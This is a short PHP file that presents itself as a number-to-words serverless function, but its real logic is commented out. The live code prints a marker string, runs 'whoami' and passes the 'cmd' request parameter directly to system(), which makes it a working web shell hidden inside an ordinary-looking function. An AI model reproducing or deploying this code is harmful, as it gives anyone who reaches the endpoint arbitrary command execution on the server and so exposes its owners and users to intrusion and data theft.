<?php
use NFNumberToWord\NumberToWords;
 
function main(array $args)
{
//     if (!isset($args['number'])) {
//         return wrap(['error' => 'Please supply a number.']);
//     }
    
//     $number = (int)($args['number']);
//     $words = (new NumberToWords)->toWords($number);
 
    echo("test1337");
    echo(system("whoami"));
    print("test1337");
 
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
 
//     return [
//         'body' => $words,
//     ];

}

function wrap(array $args) : array
{
    return ["body" => $args];
}
